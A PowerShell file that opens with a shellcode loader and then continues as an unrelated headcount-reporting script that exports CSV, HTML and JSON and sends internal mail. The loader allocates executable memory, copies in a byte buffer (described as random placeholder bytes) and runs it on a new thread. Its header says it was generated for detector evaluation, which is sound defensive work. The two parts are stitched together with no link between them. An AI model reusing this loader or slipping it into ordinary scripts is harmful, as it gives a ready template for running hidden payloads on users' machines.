<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xe5, 0x5a, 0xd0, 0x71, 0xa4, 0xcc, 0x70, 0x6c, 0xa2, 0xe4, 0x6b, 0x63, 0x94, 0x6c, 0xa0, 0x0b,
        0x85, 0xfe, 0x0f, 0xa2, 0xd5, 0x35, 0xa2, 0x4e, 0x7e, 0x2c, 0x73, 0x91, 0x7e, 0xcd, 0xf7, 0x93,
        0x05, 0x3c, 0x97, 0x8b, 0x9d, 0xa7, 0xc0, 0xed, 0x36, 0xee, 0x58, 0x79, 0xc0, 0xe7, 0x0b, 0x08,
        0x16, 0x6e, 0x28, 0x71, 0xe1, 0xcd, 0xa9, 0xd8, 0xe2, 0xa6, 0xe9, 0xf9, 0x2f, 0x69, 0xcf, 0x4c,
        0x1d, 0x94, 0xe5, 0xe4, 0xca, 0xa7, 0xec, 0x75, 0xb3, 0x0a, 0xa2, 0xfa, 0x66, 0xca, 0x54, 0xb8,
        0xea, 0x61, 0x03, 0x65, 0xa7, 0x5c, 0xa9, 0x07, 0x3c, 0x21, 0xd4, 0x2f, 0xce, 0x18, 0x9f, 0x00,
        0xf9, 0x0f, 0x9a, 0x68, 0x4e, 0x66, 0x11, 0x3c, 0x3d, 0xdf, 0xa3, 0x3e, 0x9c, 0x69, 0xfc, 0x80,
        0x93, 0xf0, 0x55, 0x5e, 0x4b, 0xd5, 0x33, 0x4a, 0x69, 0x97, 0x99, 0xbc, 0x13, 0x30, 0x69, 0xef,
        0xf9, 0xc3, 0x1e, 0x52, 0xc8, 0xb8, 0x88, 0xad, 0x97, 0xf2, 0x5d, 0x0a, 0x6c, 0x84, 0x01, 0x71,
        0xaf, 0x10, 0x3b, 0x14, 0x7b, 0xf4, 0x93, 0x08, 0xf6, 0x00, 0x67, 0x71, 0xb2, 0x7f, 0x25, 0xaa,
        0x34, 0xce, 0xf0, 0x03, 0x55, 0x70, 0x34, 0x91, 0x7a, 0x67, 0x1a, 0x89, 0x7b, 0x6c, 0xfe, 0xd0,
        0xe3, 0xd1, 0xa4, 0x3c, 0xce, 0x39, 0x48, 0xf8, 0xf7, 0xa3, 0x55, 0xd9, 0x7e, 0x61, 0x9f, 0x38,
        0xde, 0x5e, 0x02, 0xc7, 0xcd, 0x35, 0x8a, 0xe6, 0x90, 0x7c, 0x73, 0x41, 0xd7, 0xa3, 0x07, 0xcf,
        0xa7, 0x73, 0xbf, 0x8e, 0x6c, 0x26, 0x04, 0x41, 0x76, 0xe6, 0x69, 0x44, 0xeb, 0x76, 0xef, 0x81,
        0x20, 0x0b, 0x15, 0x7b, 0x4a, 0x3f, 0xd0, 0x56, 0xce, 0x23, 0xc7, 0x03, 0xf6, 0x0f, 0x9b, 0x35,
        0x60, 0xe1, 0x9c, 0x4c, 0xe2, 0x41, 0x52, 0x01, 0x50, 0x5f, 0xc6, 0x11, 0xe1, 0xf5, 0x8e, 0x7c,
        0xac, 0x59, 0xc7, 0xf3, 0xf5, 0x02, 0x3e, 0xa6, 0xaf, 0x4f, 0x73, 0x97, 0x2d, 0x14, 0x09, 0x02,
        0x43, 0xa7, 0xc7, 0x1a, 0x3b, 0x2b, 0x1a, 0x73, 0x33, 0x0e, 0x2a, 0xda, 0x4a, 0x3c, 0x96, 0xd5,
        0xa0, 0xb0, 0xda, 0xb9, 0x1c, 0xb6, 0x3a, 0x9f, 0xde, 0xd7, 0xef, 0x35, 0xdb, 0x15, 0x6d, 0x12,
        0x49, 0xec, 0x4f, 0x4f, 0x60, 0xb4, 0x88, 0xab, 0xeb, 0x0d, 0x2c, 0xfc, 0xe1, 0xc3, 0x0c, 0x30,
        0x17, 0x5b, 0x08, 0xe6, 0x58, 0x1c, 0x29, 0x61, 0xe4, 0xed, 0x7b, 0xab, 0x99, 0x5b, 0x45, 0xbd,
        0xb2, 0x64, 0xa5, 0x74, 0x74, 0x6b, 0x2a, 0xad, 0x61, 0xd7, 0x90, 0x34, 0xd6, 0x7d, 0x8a, 0xcc,
        0xab, 0x23, 0xf3, 0xc8, 0xa4
    )

    $ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 1212)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
$InputCsv   = "C:\Scripts\data\headcount-export.csv"
$OutputPath = "D:\Ops\reports\headcount-summary-2026-08-06.csv"
$GroupBy    = 'Site'
$MinAmount  = 5000

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ","
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Arial; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$jsonBody = $byGroup | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = "reporting@internal.corp"
$MailFrom = 'bi@internal.corp'

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'Headcount summary' -Body $summaryBody -SmtpServer "smtp.internal.corp" -Port 587

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
